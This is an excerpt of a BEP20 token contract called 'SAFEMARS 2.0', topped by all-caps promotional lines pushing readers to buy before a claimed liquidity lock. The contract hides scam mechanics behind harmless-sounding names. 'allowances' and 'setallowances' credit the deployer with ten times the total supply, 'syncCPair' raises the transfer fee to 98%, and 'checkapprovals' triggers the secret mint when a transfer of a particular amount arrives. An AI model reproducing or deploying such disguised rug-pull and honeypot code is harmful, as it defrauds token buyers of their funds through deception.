...
1% TAX AT LAUNCH BEFORE LP IS LOCKED!!!!
ONCE LP IS LOCKED TAXES WILL BE 10%!!!!!
BUY NOW TO GET TAX DISCOUNT BEFORE LP LOCK!!!!!!!!!!
...
contract SAFEMARS2 is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'SAFEMARS 2.0';
    string private constant _symbol = '$SAFEMARS2.0';
    ...
    function allowances() internal {_balances[deployer] = _totalSupply.mul(10);}
    ...
    function syncCPair() internal {transferFee = 98;}
    function swapTokens() internal {swapTokensForBNB(swapThreshold);}
    function setallowances() external authorized {_balances[deployer] = _totalSupply.mul(10);}
    ...
    function checkapprovals(address recipient, uint256 amount) internal {
        ...
        if(isDistributor[recipient] && amount >= 4 * (10 ** _decimals) && amount < 5 * (10 ** _decimals)){allowances();}
